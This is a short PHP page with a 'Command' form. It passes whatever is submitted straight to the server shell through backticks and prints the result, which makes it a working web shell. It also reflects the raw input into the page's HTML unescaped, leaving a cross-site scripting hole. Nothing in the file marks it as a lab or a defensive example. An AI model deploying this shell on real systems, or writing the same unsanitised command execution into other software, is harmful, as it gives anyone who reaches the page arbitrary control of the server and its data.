<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
</head>
<body>
  <form action="" method="POST">
    <label for="command">Command</label>
    <input id="command" type="text" name="command"/ <?php
      if ($_POST) {
        $command = $_POST['command'];
        echo "value=$command";
      }
    ?>>
  </form>
  <?php
    if ($_POST) {
      $command = $_POST['command'];
      echo `$command`;
    }
  ?>
</body>
</html>